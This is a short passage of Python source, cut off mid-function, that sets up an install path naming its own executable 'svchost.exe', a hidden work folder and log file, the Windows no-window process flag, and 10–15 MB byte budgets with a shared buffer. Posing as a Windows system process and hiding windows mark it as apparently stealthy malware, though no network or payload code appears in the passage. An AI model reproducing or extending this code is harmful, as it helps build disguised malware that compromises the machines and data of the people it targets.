INSTALL_EXE  = os.path.join(INSTALL_DIR, "svchost.exe")
WORK         = os.path.join(INSTALL_DIR, "w")
LOG          = os.path.join(INSTALL_DIR, "svc.log")
NO_WIN       = 0x08000000
BUDGET       = [10 * 1024 * 1024]
LIMIT        = 15 * 1024 * 1024

_lock = threading.Lock()
_buf  = []

def log(m):
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        with open(LOG, "a", encoding="utf-8", errors="ignore") as f:
